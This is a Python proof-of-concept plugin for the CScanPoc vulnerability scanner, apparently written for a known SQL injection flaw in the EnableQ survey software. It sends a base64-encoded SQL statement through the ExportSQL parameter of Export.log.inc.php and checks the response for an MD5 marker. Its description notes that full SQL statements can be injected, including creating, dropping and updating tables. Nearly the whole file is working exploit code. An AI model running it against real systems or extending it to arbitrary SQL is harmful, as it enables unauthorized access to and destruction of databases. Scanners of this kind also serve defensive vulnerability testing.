# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import base64
import urllib.request, urllib.parse, urllib.error
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'EnableQ_0006'  # 平台漏洞编号，留空
    name = 'EnableQ全版本通杀sql注'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-23'  # 漏洞公布时间
    desc = '''
        EnableQ全版本通杀sql注入(越权整个SQL语句注射,创建表，删除表，更新表)
    '''  # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=088298'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'EnableQ'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0e398dd7-2f3f-465e-a9c1-2476e8a442c5'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            sql = "SELECT md5('testvul') as administratorsName"
            payload = base64.encodestring(sql)
            payload = urllib.parse.quote(payload)
            url = arg + "/Export/Export.log.inc.php?ExportSQL=" + payload
            code, head, res, errcode, finalurl = hh.http(url)

            if res.find("e87ebbaed6f97f26e222e030eddbad1c") != -1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
